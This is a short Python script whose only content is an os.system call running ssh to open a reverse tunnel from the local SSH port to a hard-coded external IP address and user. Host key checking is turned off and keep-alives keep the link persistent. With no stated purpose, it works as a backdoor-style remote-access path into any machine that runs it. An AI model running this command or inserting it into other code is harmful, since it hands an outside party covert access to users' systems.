import os

os.system('ssh -o ServerAliveInterval=30 -o TCPKeepAlive=yes -o StrictHostKeyChecking=no -R  5555:0.0.0.0:22 rizoa@145.239.233.184')